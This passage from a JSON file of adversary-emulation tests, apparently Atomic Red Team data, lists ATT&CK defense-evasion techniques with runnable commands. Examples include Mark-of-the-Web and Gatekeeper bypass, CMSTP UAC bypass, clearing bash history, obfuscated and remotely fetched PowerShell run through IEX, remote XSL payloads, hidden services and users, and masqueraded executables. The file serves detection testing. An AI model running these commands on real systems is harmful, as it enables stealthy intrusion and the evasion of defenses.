         "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",
         "command": "Mount-DiskImage -ImagePath \"C:\\Users\\puma-4\\Desktop\\0f959a_FeelTheBurn.iso\" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel \"TestIso\"; $driveLetter = ($keep | Get-Volume).DriveLetter; invoke-item \"$($driveLetter):\\hello.exe\""
      },
      {
         "technique_id": "T1553.005",
         "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
         "tactic": "defense-evasion",
         "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n",
         "command": "Mount-DiskImage -ImagePath \"C:\\Users\\puma-4\\Desktop\\5fad3e_T1553.005.iso\""
      }
   ],
   "T1218.003": [
      {
         "technique_id": "T1218.003",
         "technique_name": "Signed Binary Proxy Execution: CMSTP",
         "tactic": "defense-evasion",
         "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n",
         "command": "cmstp.exe /s \"b27341_T1218.003_uacbypass.inf\" /au"
      },
      {
         "technique_id": "T1218.003",
         "technique_name": "Signed Binary Proxy Execution: CMSTP",
         "tactic": "defense-evasion",
         "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n",
         "command": "cmstp.exe /s \"0deff5_T1218.003.inf\""
      }
   ],
   "T1070.008": [
      {
         "technique_id": "T1070.008",
         "technique_name": "Email Collection: Mailbox Manipulation",
         "tactic": "defense-evasion",
         "description": "Copies and deletes mail data on Windows\n",
         "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }; Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore"
      },
      {
         "technique_id": "T1070.008",
         "technique_name": "Email Collection: Mailbox Manipulation",
         "tactic": "defense-evasion",
         "description": "Copies and deletes mail data on macOS\n",
         "command": "mkdir ~/Library/Mail/copy; cp -R ~/Library/Mail/* ~/Library/Mail/copy; rm -rf ~/Library/Mail/copy/*"
      },
      {
         "technique_id": "T1070.008",
         "technique_name": "Email Collection: Mailbox Manipulation",
         "tactic": "defense-evasion",
         "description": "Copies and deletes mail data on Linux\n",
         "command": "mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do   if [ \"$(basename \"$file\")\" != \"copy\" ];   then     cp -R \"$file\" /var/spool/mail/copy/;   fi; done; rm -rf /var/spool/mail/copy/*"
      },
      {
         "technique_id": "T1070.008",
         "technique_name": "Email Collection: Mailbox Manipulation",
         "tactic": "defense-evasion",
         "description": "Copies and modifies mail data on macOS\n",
         "command": "mkdir ~/Library/Mail/copy; cp -R ~/Library/Mail/* ~/Library/Mail/copy; echo \"Manipulated data\" > ~/Library/Mail/copy/manipulated.txt"
      },
      {
         "technique_id": "T1070.008",
         "technique_name": "Email Collection: Mailbox Manipulation",
         "tactic": "defense-evasion",
         "description": "Copies and modifies mail data on Windows\n",
         "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }"
      },
      {
         "technique_id": "T1070.008",
         "technique_name": "Email Collection: Mailbox Manipulation",
         "tactic": "defense-evasion",
         "description": "Copies and modifies mail data on Linux\n",
         "command": "mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do   if [ \"$(basename \"$file\")\" != \"copy\" ];   then     cp -R \"$file\" /var/spool/mail/copy/;     if [ -f \"/var/spool/mail/copy/$(basename \"$file\")\" ]; then       echo \"Modification for Atomic Red Test\" >> \"/var/spool/mail/copy/$(basename \"$file\")\";     fi;   fi; done"
      }
   ],
   "T1562.003": [
      {
         "technique_id": "T1562.003",
         "technique_name": "Impair Defenses: HISTCONTROL",
         "tactic": "defense-evasion",
         "description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n",
         "command": "TEST=$(echo $HISTFILE); echo $HISTFILE; export HISTFILE=\"/dev/null\"; if [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi"
      },
      {
         "technique_id": "T1562.003",
         "technique_name": "Impair Defenses: HISTCONTROL",
         "tactic": "defense-evasion",
         "description": "Disables history collection in shells\n",
         "command": "export HISTCONTROL=ignoreboth; whoami"
      },
      {
         "technique_id": "T1562.003",
         "technique_name": "Impair Defenses: HISTCONTROL",
         "tactic": "defense-evasion",
         "description": "An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.\n",
         "command": "cp $HISTFILE $HISTFILE.OLD; if ((${#HISTFILE[@]})); then echo $HISTFILE; fi; echo \"\" > $HISTFILE; if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi; ls -la $HISTFILE ; cat $HISTFILE; history -c ; if [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi"
      },
      {
         "technique_id": "T1562.003",
         "technique_name": "Impair Defenses: HISTCONTROL",
         "tactic": "defense-evasion",
         "description": "An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n",
         "command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi; history -c ; ls -la $HISTFILE; ls -la ~/.bash_logout; if [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi; unset HISTIGNORE; if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi; history -c ; whoami; groups; if [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi"
      },
      {
         "technique_id": "T1562.003",
         "technique_name": "Impair Defenses: HISTCONTROL",
         "tactic": "defense-evasion",
         "description": "An attacker may exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n",
         "command": "TEST=$(echo $HISTCONTROL); if [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi; history -c ; ls -la $HISTFILE; if [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi; if [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi; history -c ; ls -la $HISTFILE; ls -la $HISTFILE; ls -la $HISTFILE; if [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi"
      },
      {
         "technique_id": "T1562.003",
         "technique_name": "Impair Defenses: HISTCONTROL",
         "tactic": "defense-evasion",
         "description": "An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n",
         "command": "TEST=$(echo $HISTFILESIZE); echo $HISTFILESIZE; export HISTFILESIZE=0; if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; fi"
      }
   ],
   "T1027": [
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\""
      },
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n",
         "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug -Value $EncodedCommand; powershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\""
      },
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n",
         "command": "cat /tmp/encoded.dat | base64 -d > /tmp/art.sh; chmod +x /tmp/art.sh; /tmp/art.sh"
      },
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
         "command": "Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \"9070cd_T1027-cc-macro.xlsm\""
      },
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
         "command": "Send-MailMessage -From"
      },
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
         "command": "$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\""
      },
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
         "command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )"
      },
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n",
         "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand"
      },
      {
         "technique_id": "T1027",
         "technique_name": "Obfuscated Files or Information",
         "tactic": "defense-evasion",
         "description": "Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\""
      }
   ],
   "T1612": [
      {
         "technique_id": "T1612",
         "technique_name": "Build Image on Host",
         "tactic": "defense-evasion",
         "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.",
         "command": "docker build -t t1612  $PathtoAtomicsFolder/T1612/src/; docker run --name t1612_container  -d -t t1612; docker exec t1612_container ./test.sh"
      }
   ],
   "T1564": [
      {
         "technique_id": "T1564",
         "technique_name": "Hide Artifacts",
         "tactic": "defense-evasion",
         "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
         "command": "$macro = [System.IO.File]::ReadAllText(\"C:\\Users\\puma-4\\Desktop\\T1564-macrocode.txt\"); $macro = $macro -replace \"aREPLACEMEa\", \"C:\\Users\\puma-4\\Desktop\\extractme.bin\"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap"
      },
      {
         "technique_id": "T1564",
         "technique_name": "Hide Artifacts",
         "tactic": "defense-evasion",
         "description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n",
         "command": "sc.exe create AtomicService binPath= \"C:\\Windows\\System32\\calc.exe\" && sc sdset AtomicService \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\""
      },
      {
         "technique_id": "T1564",
         "technique_name": "Hide Artifacts",
         "tactic": "defense-evasion",
         "description": "NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account\nSee https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\n",
         "command": "cmd /c \"#{nircmd_location}\""
      },
      {
         "technique_id": "T1564",
         "technique_name": "Hide Artifacts",
         "tactic": "defense-evasion",
         "description": "Creating a user with a username containing with a space on the end",
         "command": "New-LocalUser -Name \"Administrator \" -NoPassword"
      },
      {
         "technique_id": "T1564",
         "technique_name": "Hide Artifacts",
         "tactic": "defense-evasion",
         "description": "Creating a user with a username containing \"$\"",
         "command": "net user $ ATOMIC123! /add /active:yes"
      }
   ],
   "T1564.001": [
      {
         "technique_id": "T1564.001",
         "technique_name": "Hide Artifacts: Hidden Files and Directories",
         "tactic": "defense-evasion",
         "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n",
         "command": "attrib.exe +s %temp%\\T1564.001.txt"
      },
      {
         "technique_id": "T1564.001",
         "technique_name": "Hide Artifacts: Hidden Files and Directories",
         "tactic": "defense-evasion",
         "description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n",
         "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1564.001",
         "technique_name": "Hide Artifacts: Hidden Files and Directories",
         "tactic": "defense-evasion",
         "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n",
         "command": "attrib.exe +h %temp%\\T1564.001.txt"
      },
      {
         "technique_id": "T1564.001",
         "technique_name": "Hide Artifacts: Hidden Files and Directories",
         "tactic": "defense-evasion",
         "description": "Hide a directory on MacOS\n",
         "command": "touch /var/tmp/T1564.001_mac.txt; chflags hidden /var/tmp/T1564.001_mac.txt"
      },
      {
         "technique_id": "T1564.001",
         "technique_name": "Hide Artifacts: Hidden Files and Directories",
         "tactic": "defense-evasion",
         "description": "Hide a file on MacOS\n",
         "command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\""
      },
      {
         "technique_id": "T1564.001",
         "technique_name": "Hide Artifacts: Hidden Files and Directories",
         "tactic": "defense-evasion",
         "description": "Show all hidden files on MacOS\n",
         "command": "defaults write com.apple.finder AppleShowAllFiles YES"
      },
      {
         "technique_id": "T1564.001",
         "technique_name": "Hide Artifacts: Hidden Files and Directories",
         "tactic": "defense-evasion",
         "description": "Requires Apple Dev Tools\n",
         "command": "setfile -a V /tmp/evil"
      },
      {
         "technique_id": "T1564.001",
         "technique_name": "Hide Artifacts: Hidden Files and Directories",
         "tactic": "defense-evasion",
         "description": "Creates a hidden file inside a hidden directory\n",
         "command": "mkdir /var/tmp/.hidden-directory; echo \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file"
      }
   ],
   "T1218.007": [
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n",
         "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n",
         "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName"
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
         "command": "#{msi_exe} /z \"#{dll_payload}\""
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
         "command": "#{msi_exe} /y \"#{dll_payload}\""
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n",
         "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
         "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName"
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n",
         "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
         "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName"
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
         "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName"
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n",
         "command": "#{msi_exe} /q /i \"#{msi_payload}\""
      },
      {
         "technique_id": "T1218.007",
         "technique_name": "Signed Binary Proxy Execution: Msiexec",
         "tactic": "defense-evasion",
         "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n",
         "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
      }
   ],
   "T1553.001": [
      {
         "technique_id": "T1553.001",
         "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
         "tactic": "defense-evasion",
         "description": "Gatekeeper Bypass via command line\n",
         "command": "sudo xattr -d com.apple.quarantine myapp.app"
      }
   ],
   "T1127": [
      {
         "technique_id": "T1127",
         "technique_name": "Trusted Developer Utilities Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
         "command": "copy \"5bdafa_LibHello.js\" %TEMP%\\LibHello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:library %TEMP%\\LibHello.js"
      },
      {
         "technique_id": "T1127",
         "technique_name": "Trusted Developer Utilities Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
         "command": "copy \"a25c19_hello.js\" %TEMP%\\hello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe %TEMP%\\hello.js"
      }
   ],
   "T1220": [
      {
         "technique_id": "T1220",
         "technique_name": "XSL Script Processing",
         "tactic": "defense-evasion",
         "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\""
      },
      {
         "technique_id": "T1220",
         "technique_name": "XSL Script Processing",
         "tactic": "defense-evasion",
         "description": "Executes the code specified within a XSL script using a local payload.\n",
         "command": "wmic process list /FORMAT:\"e3e9ba_wmicscript.xsl\""
      },
      {
         "technique_id": "T1220",
         "technique_name": "XSL Script Processing",
         "tactic": "defense-evasion",
         "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" \"70a91b_msxslxmlfile.xml\" \"96ede8_msxslscript.xsl\""
      },
      {
         "technique_id": "T1220",
         "technique_name": "XSL Script Processing",
         "tactic": "defense-evasion",
         "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n",
         "command": "wmic process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\""
      }
   ],
   "T1036.003": [
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n",
         "command": "copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.003_masquerading.docx.exe /Y && copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.003_masquerading.pdf.exe /Y && copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.003_masquerading.ps1.exe /Y && copy \"4bd145_T1036.003_masquerading.vbs\" %temp%\\T1036.003_masquerading.xls.vbs /Y && copy \"4bd145_T1036.003_masquerading.vbs\" %temp%\\T1036.003_masquerading.xlsx.vbs /Y && copy \"4bd145_T1036.003_masquerading.vbs\" %temp%\\T1036.003_masquerading.png.vbs /Y && copy \"107417_T1036.003_masquerading.ps1\" %temp%\\T1036.003_masquerading.doc.ps1 /Y && copy \"107417_T1036.003_masquerading.ps1\" %temp%\\T1036.003_masquerading.pdf.ps1 /Y && copy \"107417_T1036.003_masquerading.ps1\" %temp%\\T1036.003_masquerading.rtf.ps1 /Y && %temp%\\T1036.003_masquerading.docx.exe && %temp%\\T1036.003_masquerading.pdf.exe && %temp%\\T1036.003_masquerading.ps1.exe && %temp%\\T1036.003_masquerading.xls.vbs && %temp%\\T1036.003_masquerading.xlsx.vbs && %temp%\\T1036.003_masquerading.png.vbs && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1"
      },
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n",
         "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y && cmd.exe /K %APPDATA%\\taskhostw.exe"
      },
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n",
